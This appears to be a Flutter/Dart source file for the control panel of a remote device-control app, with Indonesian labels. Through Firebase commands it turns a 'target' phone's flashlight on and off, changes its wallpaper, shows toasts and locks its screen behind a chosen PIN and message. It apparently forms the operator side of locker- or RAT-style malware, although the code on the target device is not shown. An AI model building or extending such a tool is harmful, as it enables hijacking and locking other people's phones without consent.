import 'package:flutter/material.dart';
import '../services/firebase_service.dart';

class DeviceControl extends StatefulWidget {
  final String? deviceId;
  DeviceControl({this.deviceId});

  @override
  _DeviceControlState createState() => _DeviceControlState();
}

class _DeviceControlState extends State<DeviceControl> {
  late String deviceId;
  final TextEditingController wallpaperUrlController = TextEditingController();
  final TextEditingController toastMessageController = TextEditingController();

  @override
  void initState() {
    super.initState();
    deviceId = widget.deviceId ?? 'unknown';
  }

  void _sendCommand(String cmd, Map<String, dynamic> params) {
    FirebaseService.sendCommand(deviceId, cmd, params);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text("✅ Command sent: $cmd")),
    );
  }

  void _showLockDialog() {
    final TextEditingController textController = TextEditingController();
    final TextEditingController pinController = TextEditingController();

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        title: Row(
          children: [
            Icon(Icons.lock, color: Colors.red),
            SizedBox(width: 8),
            Text("Lock Screen", style: TextStyle(color: Colors.red)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: textController,
              decoration: InputDecoration(
                labelText: "Teks tampilan layar",
                hintText: "Contoh: Hp dikunci oleh admin",
                border: OutlineInputBorder(),
              ),
              maxLines: 2,
            ),
            SizedBox(height: 16),
            TextField(
              controller: pinController,
              decoration: InputDecoration(
                labelText: "PIN (wajib angka)",
                hintText: "Masukkan PIN",
                border: OutlineInputBorder(),
              ),
              keyboardType: TextInputType.number,
              obscureText: true,
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("Batal"),
          ),
          ElevatedButton(
            onPressed: () {
              String pin = pinController.text.trim();
              if (pin.isEmpty) {
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(content: Text("PIN tidak boleh kosong!"), backgroundColor: Colors.red),
                );
                return;
              }
              String text = textController.text.trim();
              Navigator.pop(context);
              _sendCommand("lock_screen", {
                "text": text,
                "pin": pin,
              });
            },
            child: Text("Kirim"),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text("🎮 Control: $deviceId")),
      body: ListView(
        padding: EdgeInsets.all(16),
        children: [
          // Flashlight
          Card(
            elevation: 4,
            child: Padding(
              padding: EdgeInsets.all(12),
              child: Column(children: [
                Row(children: [Icon(Icons.flash_on), SizedBox(width: 8), Text("Flashlight", style: TextStyle(fontSize: 18))]),
                SizedBox(height: 12),
                Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
                  ElevatedButton.icon(onPressed: () => _sendCommand("flash_on", {}), icon: Icon(Icons.flash_on), label: Text("ON")),
                  ElevatedButton.icon(onPressed: () => _sendCommand("flash_off", {}), icon: Icon(Icons.flash_off), label: Text("OFF")),
                ]),
              ]),
            ),
          ),
          SizedBox(height: 16),

          // Lock Screen (dengan dialog)
          Card(
            elevation: 4,
            color: Colors.red.shade50,
            child: Padding(
              padding: EdgeInsets.all(12),
              child: Column(children: [
                Row(children: [Icon(Icons.lock, color: Colors.red), SizedBox(width: 8), Text("Lock Screen", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold))]),
                SizedBox(height: 8),
                Text("Set teks dan PIN untuk mengunci device target", style: TextStyle(fontSize: 12)),
                SizedBox(height: 12),
                ElevatedButton.icon(
                  onPressed: _showLockDialog,
                  icon: Icon(Icons.lock_open),
                  label: Text("Buka Dialog Lock Screen"),
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                ),
              ]),
            ),
          ),
          SizedBox(height: 16),

          // Set Wallpaper
          Card(
            elevation: 4,
            child: Padding(
              padding: EdgeInsets.all(12),
              child: Column(children: [
                Row(children: [Icon(Icons.wallpaper), SizedBox(width: 8), Text("Ganti Wallpaper")]),
                SizedBox(height: 8),
                TextField(controller: wallpaperUrlController, decoration: InputDecoration(labelText: "URL gambar", border: OutlineInputBorder())),
                SizedBox(height: 8),
                ElevatedButton.icon(onPressed: () => _sendCommand("set_wallpaper", {"url": wallpaperUrlController.text}), icon: Icon(Icons.download), label: Text("Set Wallpaper")),
              ]),
            ),
          ),
          SizedBox(height: 16),

          // Toast
          Card(
            elevation: 4,
            child: Padding(
              padding: EdgeInsets.all(12),
              child: Column(children: [
                Row(children: [Icon(Icons.message), SizedBox(width: 8), Text("Toast Notification")]),
                SizedBox(height: 8),
                TextField(controller: toastMessageController, decoration: InputDecoration(labelText: "Pesan toast", border: OutlineInputBorder())),
                SizedBox(height: 8),
                ElevatedButton.icon(onPressed: () => _sendCommand("toast", {"message": toastMessageController.text}), icon: Icon(Icons.notifications_active), label: Text("Tampilkan Toast")),
              ]),
            ),
          ),
        ],
      ),
    );
  }
}